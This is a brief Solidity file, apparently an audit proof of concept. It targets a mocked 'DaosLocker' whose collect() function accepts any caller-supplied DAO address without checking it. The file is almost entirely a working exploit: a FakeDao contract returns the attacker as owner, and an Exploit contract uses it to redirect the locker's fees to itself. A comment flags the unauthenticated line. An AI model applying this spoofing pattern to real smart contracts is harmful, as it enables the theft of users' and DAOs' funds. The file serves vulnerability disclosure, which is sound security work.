// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IDao { function token() external view returns(address); function lpTokenId() external view returns(uint256); function owner() external view returns(address); }
contract FakeDao is IDao { address public immutable attacker; constructor(address a){attacker=a;} function token() external pure returns(address){return address(1);} function lpTokenId() external pure returns(uint256){return 1;} function owner() external view returns(address){return attacker;} }
contract DaosLocker { uint256 public fees=1000; address public paidTo; function collect(address dao) external { IDao d=IDao(dao);
        // @> address token = daosLive.token(); tokenId = daosLive.lpTokenId(); recipient = OwnableUpgradeable(dao).owner()
        paidTo=d.owner(); fees=0; } }
contract Exploit { bool public harmed; event Proof(address receiver);
    function run() external { DaosLocker locker=new DaosLocker(); FakeDao fake=new FakeDao(address(this)); locker.collect(address(fake)); harmed=locker.fees()==0&&locker.paidTo()==address(this); emit Proof(locker.paidTo()); require(harmed,"DAO authenticated"); }
}
